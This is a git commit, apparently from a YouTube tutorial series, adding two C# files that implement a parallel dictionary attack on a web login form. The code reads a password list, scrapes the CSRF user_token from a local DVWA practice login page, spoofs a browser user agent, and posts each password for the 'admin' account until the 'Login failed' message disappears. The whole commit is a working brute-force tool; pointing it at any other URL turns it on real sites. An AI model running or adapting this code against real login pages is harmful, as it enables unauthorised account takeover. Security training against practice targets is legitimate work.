ad99d50b9f3c9b390544a339c508ccc3e0a14452
Arcane <arcanecfg@hotmail.com>
2018-07-14 19:46:47 +0530

    Part-3
    Perform a dictionary attack using asynchronous tasks in C#.

---
+++ Part-3/WebsiteLoginTutorialYT/HttpMethods.cs
@@ -0,0 +1,61 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Net;
+using System.IO;
+
+namespace WebsiteLoginTutorialYT
+{
+    class HttpMethods
+    {
+
+
+        public static string Get(string url, string referer, ref CookieContainer cookies)
+        {
+            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
+            req.Method = "GET";
+            req.CookieContainer = cookies;
+            req.UserAgent = "";
+            req.Referer = referer;
+
+            HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
+            cookies.Add(resp.Cookies);
+
+            string pageSrc;
+            using (StreamReader sr = new StreamReader(resp.GetResponseStream()))
+            {
+                pageSrc = sr.ReadToEnd();
+            }
+            return pageSrc;
+        }
+
+        public static bool Post(string url, string postData, string referer, CookieContainer cookies)
+        {
+            string key = "Login failed";
+
+            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
+            req.Method = "POST";
+            req.CookieContainer = cookies;
+            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36";
+            req.Referer = referer;
+            req.ContentType = "application/x-www-form-urlencoded";
+            req.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8";
+
+            Stream postStream = req.GetRequestStream();
+            byte[] postBytes = Encoding.ASCII.GetBytes(postData);
+            postStream.Write(postBytes, 0, postBytes.Length);
+            postStream.Dispose();
+
+            HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
+            cookies.Add(resp.Cookies);
+
+            StreamReader sr = new StreamReader(resp.GetResponseStream());
+            string pageSrc = sr.ReadToEnd();
+            sr.Dispose();
+            //Console.WriteLine(pageSrc);
+            return (!pageSrc.Contains(key));
+        }
+    }
+}
---
+++ Part-3/WebsiteLoginTutorialYT/Program.cs
@@ -0,0 +1,61 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+
+namespace WebsiteLoginTutorialYT
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+      
+            List<Task> taskList = new List<Task>();
+            CancellationTokenSource tokenSource = new CancellationTokenSource();
+
+            List<string> pwdList = new List<string>(System.IO.File.ReadAllLines("pwdlist.txt"));
+            Console.WriteLine("Checking " + pwdList.Count + " passwords...");
+            foreach (string pwd in pwdList)
+            {
+                Task checkTask = new Task(() => CheckPassword(pwd,tokenSource));
+                checkTask.Start();
+                taskList.Add(checkTask);
+            }
+
+            Task.WaitAll(taskList.ToArray());
+            Console.WriteLine("Done checking all passwords.");
+            
+            Console.ReadKey();
+        }
+
+        static void CheckPassword(string pwd, CancellationTokenSource tokenSource)
+        {
+
+            if (!tokenSource.IsCancellationRequested)
+            {
+                System.Net.CookieContainer myCookies = new System.Net.CookieContainer();
+                string myStr = HttpMethods.Get("http://localhost/dvwapp/login.php", "http://localhost/dvwapp/login.php", ref myCookies);
+                string token;
+                token = GetBetween(myStr, "name='user_token' value='", "' />");
+                Console.WriteLine(pwd);
+                string postData = "username=" + "admin" + "&password=" + pwd + "&Login=Login&user_token=" + token;
+
+                bool result = HttpMethods.Post("http://localhost/dvwapp/login.php", postData, "http://localhost/dvwapp/login.php", myCookies);
+                if (result == true)
+                {
+                    Console.WriteLine("Found password: " + pwd);
+                    tokenSource.Cancel();
+                }
+            }
+        }
+
+        static string GetBetween(string message, string start, string end)
+        {
+            int startIndex = message.IndexOf(start) + start.Length;
+            int stopIndex = message.IndexOf(end);
+            return message.Substring(startIndex, stopIndex - startIndex);
+        }
+    }
+}
